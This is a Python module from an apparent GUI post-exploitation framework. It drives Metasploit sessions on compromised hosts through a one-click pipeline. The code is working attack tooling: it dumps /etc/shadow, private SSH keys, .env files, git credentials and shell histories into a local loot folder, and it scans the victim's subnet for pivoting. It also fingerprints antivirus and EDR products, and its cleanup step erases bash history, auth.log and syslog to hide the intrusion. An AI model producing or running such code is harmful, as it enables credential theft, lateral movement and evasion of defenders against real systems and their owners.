# language: Python, file: modules/post_pipeline.py
# Post-Exploitation Pipeline — automatic enum, loot, pivot, report
import customtkinter as ctk
import threading
import json
import os
import re
from datetime import datetime
from utils.progress import ProgressTracker


class PostPipelineModule:
    """
    خط أنابيب تلقائي يعمل بمجرد فتح جلسة C2.
    يكتشف، يسرق، يحلل، يوثق — كل شيء بأمر واحد.
    """
    def __init__(self, log_queue, app=None):
        self.log = log_queue
        self.name = "post_pipeline"
        self.app = app
        self.progress = ProgressTracker(log_queue)
        self.results = {}       # sid → findings
        self.loot_dir = "loot"

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="POST-EXPLOITATION PIPELINE",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="auto-enum · auto-loot · auto-pivot · auto-report",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ── session picker ──
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)
        r = ctk.CTkFrame(cfg, fg_color="transparent")
        r.pack(fill="x", padx=12, pady=8)
        ctk.CTkLabel(
            r, text="Session:",
            font=ctk.CTkFont(size=11), text_color="#c8d6e5"
        ).pack(side="left", padx=(0, 8))

        self.session_entry = ctk.CTkEntry(
            r, placeholder_text="session id (e.g. 1)",
            width=180, height=32, fg_color="#05080c", border_color="#1a2332"
        )
        self.session_entry.pack(side="left", padx=(0, 8))

        self.use_all = ctk.CTkCheckBox(
            r, text="All sessions",
            fg_color="#0d2818", hover_color="#1a4a2e",
            text_color="#c8d6e5"
        )
        self.use_all.select()
        self.use_all.pack(side="left", padx=(0, 8))

        # ── actions ──
        ctk.CTkLabel(
            parent, text="Pipeline operations:",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="#c8d6e5"
        ).pack(pady=(16, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)
        actions = [
            ("⚡ Full pipeline", self._run_full),
            ("⌖ Enum system", self._enum_system),
            ("⌖ Enum network", self._enum_network),
            ("⌖ Enum users", self._enum_users),
            ("⌖ Enum sudo/SUID", self._enum_privesc),
            ("⚡ Loot files", self._loot_files),
            ("⚡ Loot creds", self._loot_creds),
            ("⚡ Loot SSH keys", self._loot_ssh),
            ("⚡ Loot history", self._loot_history),
            ("⌖ Pivot scan", self._pivot_scan),
            ("⌖ Pivot ARP", self._pivot_arp),
            ("⌖ Detect AV/EDR", self._detect_av),
            ("⚡ Clean artifacts", self._cleanup),
            ("▤ Generate report", self._report),
            ("▤ Export JSON", self._export_json),
            ("⌖ Show results", self._show_results),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=200, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        # ── output ──
        ctk.CTkLabel(
            parent, text="Output:",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="#c8d6e5"
        ).pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=400
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _get_sessions(self):
        """يعيد قائمة session IDs المتاحة"""
        if self.use_all.get():
            try:
                c2ui = self.app.modules.get("c2_ui") if self.app else None
                if c2ui:
                    return list(c2ui.sessions.keys())
            except Exception:
                pass
            return []
        sid = self.session_entry.get().strip()
        return [sid] if sid else []

    def _exec(self, sid, cmd, timeout=30):
        """ينفذ أمراً على جلسة عبر Metasploit"""
        try:
            c2ui = self.app.modules.get("c2_ui") if self.app else None
            if not c2ui or not hasattr(c2ui, "msf_bridge"):
                return ""
            bridge = c2ui.msf_bridge
            if not bridge or not bridge.client:
                return ""
            session = bridge.client.sessions.session(sid)
            session.write(cmd + "\n")
            import time
            time.sleep(1.5)
            output = session.read()
            return output or ""
        except Exception as e:
            return f"[error] {e}"

    # ==================== ENUMERATION ====================
    def _enum_system(self):
        cmds = [
            "whoami", "id", "uname -a", "hostname",
            "cat /etc/os-release 2>/dev/null",
            "uptime", "date", "df -h", "free -h",
            "systeminfo 2>nul",
        ]
        self._multi_exec("System Enum", cmds)

    def _enum_network(self):
        cmds = [
            "ip a 2>/dev/null || ifconfig -a",
            "ip route 2>/dev/null || route -n",
            "cat /etc/resolv.conf",
            "netstat -an 2>/dev/null | head -50",
            "ss -tulpn 2>/dev/null | head -50",
        ]
        self._multi_exec("Network Enum", cmds)

    def _enum_users(self):
        cmds = [
            "cat /etc/passwd",
            "cat /etc/shadow 2>/dev/null | head -20",
            "last -20",
            "who",
            "w",
        ]
        self._multi_exec("Users Enum", cmds)

    def _enum_privesc(self):
        cmds = [
            "sudo -l 2>/dev/null",
            "find / -perm -4000 -type f 2>/dev/null | head -30",
            "find / -perm -2000 -type f 2>/dev/null | head -30",
            "cat /etc/crontab 2>/dev/null",
            "ls -la /etc/cron.* 2>/dev/null",
            "find / -writable -type d 2>/dev/null | head -20",
        ]
        self._multi_exec("PrivEsc Enum", cmds)

    # ==================== LOOTING ====================
    def _loot_files(self):
        """يسحب الملفات الحساسة إلى loot/"""
        sid_list = self._get_sessions()
        if not sid_list:
            self._out("[!] no sessions")
            return
        paths = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "/etc/ssh/sshd_config", "/root/.bashrc",
            "/home/*/.bashrc", "/etc/mysql/my.cnf",
            "/var/www/html/config.php",
            "/etc/apache2/apache2.conf",
        ]
        for sid in sid_list:
            out_dir = os.path.join(self.loot_dir, f"host-{sid}")
            os.makedirs(out_dir, exist_ok=True)
            self._out(f"\n[*] Looting from session {sid}")
            for path in paths:
                content = self._exec(sid, f"cat {path} 2>/dev/null")
                if content and "[error]" not in content and len(content) > 20:
                    safe_name = path.replace("/", "_").strip("_")
                    file_path = os.path.join(out_dir, safe_name)
                    with open(file_path, "w") as f:
                        f.write(content)
                    self._out(f"[+] {path} → {len(content)} bytes")

    def _loot_creds(self):
        sid_list = self._get_sessions()
        cmds = [
            "cat ~/.netrc 2>/dev/null",
            "cat ~/.git-credentials 2>/dev/null",
            "grep -rE 'password|passwd|pwd' /var/www 2>/dev/null | head -20",
            "find / -name '*.env' 2>/dev/null | head -20",
            "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "cat /var/log/auth.log 2>/dev/null | tail -50",
        ]
        for sid in sid_list:
            self._out(f"\n[*] Loot credentials from {sid}")
            for cmd in cmds:
                content = self._exec(sid, cmd)
                if content and "[error]" not in content:
                    self._out(f"$ {cmd}\n{content[:500]}")

    def _loot_ssh(self):
        sid_list = self._get_sessions()
        for sid in sid_list:
            out_dir = os.path.join(self.loot_dir, f"host-{sid}", "ssh")
            os.makedirs(out_dir, exist_ok=True)
            self._out(f"\n[*] Looting SSH keys from {sid}")
            find_cmd = "find / -name 'id_*' -o -name '*.pem' 2>/dev/null | head -20"
            result = self._exec(sid, find_cmd)
            if result:
                for line in result.splitlines():
                    line = line.strip()
                    if line and not line.startswith("[error]"):
                        content = self._exec(sid, f"cat {line} 2>/dev/null")
                        if content and "PRIVATE KEY" in content:
                            name = os.path.basename(line)
                            with open(os.path.join(out_dir, name), "w") as f:
                                f.write(content)
                            self._out(f"[+] saved {line}")

    def _loot_history(self):
        sid_list = self._get_sessions()
        cmds = [
            "cat ~/.bash_history 2>/dev/null",
            "cat ~/.zsh_history 2>/dev/null",
            "cat /root/.mysql_history 2>/dev/null",
            "cat /var/log/wtmp 2>/dev/null | strings | tail -30",
        ]
        for sid in sid_list:
            out_dir = os.path.join(self.loot_dir, f"host-{sid}")
            os.makedirs(out_dir, exist_ok=True)
            for cmd in cmds:
                content = self._exec(sid, cmd)
                if content and "[error]" not in content:
                    with open(os.path.join(out_dir, "history.txt"), "a") as f:
                        f.write(f"\n=== {cmd} ===\n{content}")
                    self._out(f"[+] history from {sid}")

    # ==================== PIVOT ====================
    def _pivot_scan(self):
        """يفحص الشبكة من جهاز الضحية"""
        sid_list = self._get_sessions()
        for sid in sid_list:
            self._out(f"\n[*] Scanning network from {sid}")
            # احصل على الشبكة
            net = self._exec(sid, "ip -4 -o addr | grep -v 127.0.0.1 | head -3")
            self._out(f"Interfaces: {net[:300]}")
            # جرب فحص سريع
            self._exec(sid, "for i in $(seq 1 254); do (ping -c1 -W1 192.168.0.$i >/dev/null 2>&1 && echo 192.168.0.$i) & done; wait")
            result = self._exec(sid, "ip neigh 2>/dev/null | head -30")
            self._out(f"Neighbors: {result[:500]}")

    def _pivot_arp(self):
        sid_list = self._get_sessions()
        for sid in sid_list:
            arp = self._exec(sid, "arp -a 2>/dev/null || ip neigh 2>/dev/null")
            self._out(f"\n[*] ARP from {sid}:\n{arp[:1000]}")

    # ==================== DEFENSE DETECTION ====================
    def _detect_av(self):
        sid_list = self._get_sessions()
        cmds = [
            "ps aux | grep -iE 'defender|avast|kaspersky|sophos|carbonblack|crowdstrike' | grep -v grep",
            "systemctl list-units --type=service 2>/dev/null | grep -iE 'av|edr|defender'",
            "ls /opt 2>/dev/null",
            "ls /usr/local/bin 2>/dev/null | head -20",
            "netstat -an 2>/dev/null | grep -E ':443|:8080' | head -10",
        ]
        for sid in sid_list:
            self._out(f"\n[*] Detecting defenses on {sid}")
            for cmd in cmds:
                result = self._exec(sid, cmd)
                if result and len(result) > 20:
                    self._out(f"$ {cmd}\n{result[:400]}")

    # ==================== CLEANUP ====================
    def _cleanup(self):
        sid_list = self._get_sessions()
        cmds = [
            "history -c 2>/dev/null",
            "rm -f ~/.bash_history 2>/dev/null",
            "rm -rf /tmp/.* 2>/dev/null",
            "cat /dev/null > /var/log/auth.log 2>/dev/null",
            "cat /dev/null > /var/log/syslog 2>/dev/null",
            "unset HISTFILE",
        ]
        for sid in sid_list:
            self._out(f"\n[*] Cleaning artifacts on {sid}")
            for cmd in cmds:
                self._exec(sid, cmd)
            self._out(f"[+] {sid} cleaned")

    # ==================== FULL PIPELINE ====================
    def _run_full(self):
        def run():
            self._out("\n" + "="*60)
            self._out("  FULL POST-EXPLOITATION PIPELINE")
            self._out("="*60 + "\n")
            steps = [
                ("System Enum", self._enum_system),
                ("Network Enum", self._enum_network),
                ("Users Enum", self._enum_users),
                ("PrivEsc Enum", self._enum_privesc),
                ("Loot Files", self._loot_files),
                ("Loot SSH", self._loot_ssh),
                ("Loot History", self._loot_history),
                ("Detect AV", self._detect_av),
                ("Pivot ARP", self._pivot_arp),
            ]
            for i, (name, fn) in enumerate(steps, 1):
                self._out(f"\n[{i}/{len(steps)}] {name}...")
                try:
                    fn()
                except Exception as e:
                    self._out(f"[!] {name}: {e}")
            self._out("\n" + "="*60)
            self._out("  PIPELINE COMPLETE")
            self._out("="*60)
            # auto-report
            self._report()
        threading.Thread(target=run, daemon=True).start()

    def _multi_exec(self, label, cmds):
        sid_list = self._get_sessions()
        if not sid_list:
            self._out(f"[!] {label}: no sessions")
            return
        def run():
            for sid in sid_list:
                self._out(f"\n[*] {label} on session {sid}")
                for cmd in cmds:
                    result = self._exec(sid, cmd)
                    if result:
                        self._out(f"$ {cmd}\n{result[:800]}")
        threading.Thread(target=run, daemon=True).start()

    # ==================== REPORTING ====================
    def _report(self):
        """يولد تقرير PDF لما تم جمعه"""
        def run():
            try:
                from fpdf import FPDF
            except ImportError:
                self._out("[!] fpdf2 not installed — run: pip install fpdf2")
                return
            os.makedirs("reports", exist_ok=True)
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font("Courier", "B", 14)
            pdf.cell(0, 10, "Post-Exploitation Report", ln=True)
            pdf.set_font("Courier", "", 9)
            pdf.cell(0, 6, f"Generated: {datetime.now().isoformat()}", ln=True)
            pdf.cell(0, 6, f"Sessions: {len(self._get_sessions())}", ln=True)
            pdf.ln(4)

            # enumerate loot directory
            for root, _, files in os.walk(self.loot_dir):
                for f in files:
                    path = os.path.join(root, f)
                    size = os.path.getsize(path)
                    pdf.cell(0, 4, f"{path} ({size} bytes)", ln=True)

            out = f"reports/post_exploitation_{int(datetime.now().timestamp())}.pdf"
            pdf.output(out)
            self._out(f"\n[+] Report → {out}")
        threading.Thread(target=run, daemon=True).start()

    def _export_json(self):
        import tkinter.filedialog as fd
        path = fd.asksaveasfilename(
            defaultextension=".json",
            initialfile="post_exploitation.json"
        )
        if not path:
            return
        # collect findings
        findings = {
            "sessions": self._get_sessions(),
            "loot_files": [],
            "timestamp": datetime.now().isoformat(),
        }
        for root, _, files in os.walk(self.loot_dir):
            for f in files:
                findings["loot_files"].append({
                    "path": os.path.join(root, f),
                    "size": os.path.getsize(os.path.join(root, f)),
                })
        with open(path, "w") as fp:
            json.dump(findings, fp, indent=2)
        self._out(f"[+] JSON → {path}")

    def _show_results(self):
        self.out.delete("1.0", "end")
        self._out("=== LOOT INVENTORY ===")
        if not os.path.exists(self.loot_dir):
            self._out("no loot yet")
            return
        for root, _, files in os.walk(self.loot_dir):
            self._out(f"\n{root}/")
            for f in files:
                size = os.path.getsize(os.path.join(root, f))
                self._out(f"  {f} ({size} bytes)")
